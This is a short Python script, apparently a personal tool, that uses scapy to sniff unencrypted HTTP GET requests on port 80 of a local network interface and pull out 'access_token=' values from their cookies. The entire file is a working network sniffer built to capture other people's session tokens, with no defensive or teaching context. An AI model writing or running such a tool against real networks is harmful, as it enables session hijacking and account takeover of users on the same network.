#!/usr/bin/python
from scapy.all import *
import re

stars = lambda n: "*" * n

def GET_print(packet):
    data = '\n'.join(packet.sprintf('%Raw.load%').split(r'\r\n'))
    # p = re.compile(r'access_token=')
    # p.findall(data)
    index = data.find('access_token=')
    print('COOKIE', data[index:index+40])
    return data[index:index+40] if index != -1 else None


    # return data
    # return "\n".join((
    #     stars(40) + 'GET PACKET' + stars(40),
    #     "\n".join(packet.sprintf("{Raw:%Raw.load%}").split(r"\r\n")),
    #     stars(90)))

sniff(
    iface='enp2s0',
    prn=GET_print,
    lfilter=lambda p: 'GET' in str(p) and 'Cookie' in str(p),
    filter='tcp port 80')